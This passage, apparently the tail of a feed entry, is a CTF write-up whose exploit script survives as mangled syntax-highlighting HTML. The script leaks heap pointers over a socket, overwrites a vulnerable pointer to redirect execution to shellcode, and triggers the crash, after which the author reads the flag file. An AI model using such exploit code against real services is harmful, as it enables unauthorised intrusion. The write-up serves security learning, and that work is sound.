<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">pivot</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">vulnerable</span> <span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>

<p>(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).</p>

<p>Now it was a matter of getting the flag. I tried <code>/home/amazon/key</code>, which returned nothing. Next was <code>/home/amazon/flag</code> and that was a bingo :)</p>
]]></content>
  </entry>
  
</feed>
